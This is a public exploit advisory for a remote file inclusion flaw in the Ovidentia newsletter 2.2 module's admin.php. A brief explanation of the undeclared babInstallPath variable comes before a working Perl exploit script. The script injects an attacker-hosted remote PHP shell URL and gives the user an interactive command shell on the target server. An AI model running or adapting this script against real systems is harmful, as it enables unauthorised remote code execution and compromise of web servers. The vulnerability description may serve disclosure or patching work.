# Title: Ovidentia Module newsletter 2.2 (admin.php) Remote File Inclusion Exploit
# Author: bd0rk
# eMail: bd0rk[at]hackermail.com
# Twitter: twitter.com/bd0rk
# Tested on: Ubuntu-Linux
# Download: http://www.ovidentia.org/index.php?tg=fileman&sAction=getFile&id=17&gr=Y&path=Downloads%2FAdd-ons%2FModules%2Fnewsletter&file=newsletter-2-2.zip&idf=882

# Proof-of-Concept:

# /newsletter-2-2/programs/admin.php line 3
# ----------------------------------------------------------

# require_once($GLOBALS['babInstallPath'].'admin/acl.php');

# ----------------------------------------------------------

# Problem: The $GLOBALS['babInstallPath']-parameter isn't declared before require_once.
# Fix: Declare this parameter or use an alert in php-sourcecode.
#     Zum Beispiel "BummPrengeleng du Nasenmensch!" :D

# ----------------
# ~~Exploitcode~~
# ----------------

use LWP::UserAgent;
 
$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];
 
if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}
 
head();
 
while()
{
       print "[shell] \$";
while(<STDIN>)
       {
               $cmd=$_;
               chomp($cmd);
 
$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$Path.'programs/admin.php?GLOBALS[babInstallPath]'.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";
 
$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[\n]/[....]/;
 
if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}
 
elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
       {print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}
 
if($return =~ /(.*)/)
 
 
{
       $finreturn = $1;
       $finreturn=~ tr/[....]/[\n]/;
       print "\r\n$finreturn\n\r";
       last;
}
 
else {print "[shell] \$";}}}last;
 
sub head()
 {
 print "\n============================================================================\r\n";
 print " *Ovidentia Module newsletter 2.2 (admin.php) Remote File Inclusion Exploit*\r\n";
 print "============================================================================\r\n";
 }
sub usage()
 {
 head();
 print " Usage: sploit.pl [someone] [cmd shell location] [cmd shell variable]\r\n\n";
 print " <Site> - Full path to phgstats ex: http://www.someone.com/ \r\n";
 print " <cmd shell> - Path to cmd Shell e.g http://www.someone/cmd.txt \r\n";
 print " <cmd variable> - Command variable used in php shell \r\n";
 print "============================================================================\r\n";
 print "                           Bug Found by bd0rk \r\n";
 print "============================================================================\r\n";
 exit();
 }